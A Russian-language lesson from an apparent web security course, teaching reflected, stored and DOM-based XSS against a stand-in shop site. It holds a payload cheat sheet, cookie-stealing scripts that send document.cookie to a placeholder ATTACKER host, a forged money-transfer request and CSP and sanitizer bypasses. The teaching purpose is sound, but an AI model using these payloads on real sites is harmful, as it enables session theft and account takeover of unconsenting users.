## Вопрос, с которого всё начинается

До сих пор мы ломали **сервер**: выполняли команды, читали файлы. XSS — атака на **браузер жертвы**: мы заставляем чужой браузер исполнить наш JavaScript в контексте уязвимого сайта.

Вопрос: как подсунуть браузеру свой скрипт? Ответ прост: если сайт вставляет твой ввод в страницу **без экранирования**, браузер принимает твой текст за код. Сегодня разберём три вида XSS на одном примере — сайте с поиском и профилем.

## Наш пример

Есть сайт `shop.example` со страницей поиска. Отправим обычный запрос и посмотрим на ответ:

```bash
$ curl -s 'https://shop.example/search?q=ноутбук'
<h1>Результаты для ноутбук</h1>
```

Наш запрос **отразился** в HTML. Проверим, экранирует ли сервер спецсимволы — подадим HTML-тег:

```bash
$ curl -s 'https://shop.example/search?q=<b>1</b>'
<h1>Результаты для <b>1</b></h1>
```

Тег `<b>` попал в ответ **как тег**, а не как текст. Значит, сервер не экранирует HTML. Пробуем скрипт:

```bash
$ curl -s 'https://shop.example/search?q=<script>alert(1)</script>'
<h1>Результаты для <script>alert(1)</script></h1>
```

В ответе есть `<script>alert(1)</script>`. Откроем эту ссылку в браузере — выскочит окно `alert`. Это **reflected XSS** (отражённый): payload пришёл в параметре и сразу отразился в ответе.

## Шаг 1: контекст решает всё

Ошибка №1 новичка — думать, что «экранирование угловых скобок» решает всё. На самом деле важно, **куда** попадает ввод:

| Контекст | Пример | Что нужно |
|----------|--------|-----------|
| HTML-текст | `<div>USER</div>` | экранировать `<` `>` `&` |
| HTML-атрибут | `<input value="USER">` | экранировать `"` и `<` |
| JS-строка | `var x='USER'` | экранировать `'` и `</script>` |
| URL/href | `<a href="USER">` | запретить `javascript:` |

В нашем примере ввод попал в **HTML-текст**, поэтому `<script>` сработал. В атрибуте он бы не сработал — об этом ниже.

## Шаг 2: payload под контекст

Если ввод попадает в атрибут `<input value="USER">`, `<script>` бесполезен — тег внутри атрибута не исполняется. Нужно **выйти** из атрибута и добавить событие:

```html
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
```

Первая кавычка закрывает `value`, дальше мы дописываем обработчик события. Как только жертва наведёт мышь или элемент получит фокус — сработает наш код.

Полезная шпаргалка по контекстам:

| Контекст | Payload |
|----------|---------|
| HTML | `<script>alert(1)</script>` |
| атрибут | `"><script>alert(1)</script>` |
| атрибут (событие) | `" autofocus onfocus=alert(1)` |
| JS-строка | `';alert(1)//` |
| href | `javascript:alert(1)` |
| без пробелов | `<svg/onload=alert(1)>` |

## Шаг 3: хранимый XSS

Отражённый XSS требует, чтобы жертва кликнула на нашу ссылку — это социальная инженерия. **Хранимый** XSS опаснее: payload сохраняется на сервере и срабатывает у **всех**, кто откроет страницу.

На нашем сайте есть поле «О себе» в профиле:

```bash
$ curl -s -b jar -X POST https://shop.example/profile \
  --data-urlencode 'bio=<script>fetch("https://ATTACKER/?c="+document.cookie)</script>'
$ curl -s -b jar https://shop.example/profile | grep -i 'script>fetch'
<script>fetch("https://ATTACKER/?c="+document.cookie)</script>
```

Payload сохранён и отдаётся на странице профиля. Теперь любой, кто откроет этот профиль, исполнит наш скрипт — и отправит свою cookie на наш сервер. А если профиль открывает **администратор**, мы захватываем его аккаунт. Именно поэтому хранимый XSS — один из самых опасных видов.

## Шаг 4: DOM-based XSS

Третий вид — payload вообще не доходит до сервера. Клиентский JavaScript читает данные из адресной строки и вставляет их в опасное место:

```js
document.getElementById('x').innerHTML = location.hash.substring(1);
```

Сервер вернёт тот же HTML для всех, а код исполнит **браузер**:

```bash
$ curl -s 'https://shop.example/#<img src=x onerror=alert(1)>'
```

`innerHTML` — «опасное место» (sink): он интерпретирует строку как HTML. `<img src=x onerror=...>` не может загрузить картинку и вызывает `onerror`. Важно: это **не видно через curl** — серверный ответ одинаков. Проверять DOM-based XSS нужно в реальном браузере (DevTools → Elements/Console).

## Шаг 5: cookie-флаги и что остаётся

Классический payload крадёт cookie:

```js
new Image().src = 'https://ATTACKER/?c=' + document.cookie;
```

Флаг **`HttpOnly`** делает cookie невидимой для `document.cookie` — этот payload её не прочитает. Но XSS остаётся опасным и без cookie: мы можем **выполнять действия от имени жертвы**:

```js
fetch('/api/transfer', {method:'POST', credentials:'include',
  body: JSON.stringify({to:'attacker', amount:1000})});
```

Браузер сам добавит cookie к запросу, а он пойдёт с того же origin. Так XSS превращается в «CSRF без CSRF-токена». Ещё можно украсть токен из `localStorage`, если он там лежит.

## Шаг 6: CSP и санитайзеры

`Content-Security-Policy: script-src 'self'` без `'unsafe-inline'` запрещает inline-`<script>` и `on*`-обработчики. Что тогда сработает? Загрузка скрипта **с того же origin**:

```html
<script src="/uploads/evil.js"></script>
```

Если сайт разрешает загрузку файлов (см. `web-file-upload`), мы зальём туда `evil.js` и подключим его — CSP пропустит. Обходы CSP подробно разобраны в `web-csp-bypass`.

Если стоит санитайзер (например, DOMPurify), попробуй **mXSS** — браузер «перепарсит» DOM и превратит «безопасную» разметку в исполняемую:

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

Правило: наличие санитайзера — это начало работы, а не конец.

## Шаг 7: что доказывать в отчёте

`alert(1)` — это только доказательство исполнения, не цель. Хороший отчёт содержит:

1. **точный контекст** (HTML/атрибут/JS/DOM);
2. **минимальный payload**;
3. **доказательство исполнения** — скриншот `alert` или OOB-запрос (`fetch('//oob')`, видно в твоём листенере);
4. **влияние** — кража сессии, действие от имени жертвы, чтение приватных данных;
5. **обход защиты**, если был (CSP/WAF/санитайзер).

Плохо: «payload отражается в ответе». Хорошо: «payload исполняется в браузере и позволяет украсть сессию администратора».

## Что мы теперь знаем

- XSS — исполнение нашего JS в браузере жертвы в контексте сайта.
- **Reflected** — payload в ответе на наш запрос (нужна ссылка).
- **Stored** — payload сохранён и срабатывает у всех (опаснее).
- **DOM-based** — исполняет клиентский JS, сервер не при чём (curl не видит).
- Контекст (HTML/атрибут/JS/href) определяет payload.
- `HttpOnly` мешает краже cookie, но не действиям от имени жертвы.
- CSP и санитайзеры обходятся (`web-csp-bypass`, mXSS).
- Артефакт — исполнение (alert/OOB) и конкретное влияние.

## На что смотреть дальше

- **Не используй `<script>` везде** — в атрибуте и JS-строке он не работает.
- **Отражение ≠ исполнение.** Убедись, что браузер реально исполняет payload.
- **DOM-based проверяй в браузере**, а не curl'ом.
- **`HttpOnly` — не панацея:** действия от имени жертвы остаются.
- **Учитывай CSP** — при `'self'` грузи скрипт со своего origin.
- **Только с согласия** — при stored XSS payload сохраняется на сервере.

## Куда дальше

Дальше мы возьмём два родственных XSS класса: **open redirect / CRLF** и **dangling markup** — они не выполняют JS напрямую, но утекают данные и ломают разметку (`web-open-redirect-crlf`). А пока главное запомни: XSS — это **контекст плюс исполнение**, и `alert` — только доказательство, а не цель.

## Где пригодится

- **CTF (Web):** XSS часто используется для «доставки» эксплойта боту-админу (steal cookie → флаг).
- **Bug bounty:** XSS на чувствительных страницах (с токенами, админках) — высокооплачиваемая находка; хранимый в админке — почти всегда critical.
- **Пентест:** XSS входит в OWASP Top 10 и обязателен в отчёте.
- **Работа (AppSec):** контекстно-зависимое экранирование, CSP, `HttpOnly` — базовые средства защиты.
